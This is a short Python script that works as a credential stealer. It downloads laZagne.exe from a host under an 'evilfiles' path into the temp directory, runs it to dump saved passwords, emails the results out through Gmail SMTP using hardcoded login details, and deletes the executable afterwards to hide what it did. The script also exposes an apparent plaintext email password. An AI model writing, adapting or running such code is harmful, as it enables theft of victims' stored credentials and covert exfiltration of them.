import requests,smtplib,subprocess,os,tempfile


def download(url):
    get_response=requests.get(url)
    # print(get_response)
    # print(get_response.content)
    filename=url.split("/")[-1]
    with open(filename,"wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_dir=tempfile.gettempdir()

os.chdir(temp_dir)

download("http://192.168.1.3/evilfiles/laZagne.exe")

results = subprocess.check_output("laZagne.exe", shell=True)

send_mail("srikanthsri93096@gmail.com", "srikanth1434@", results)

os.remove("laZagne.exe")




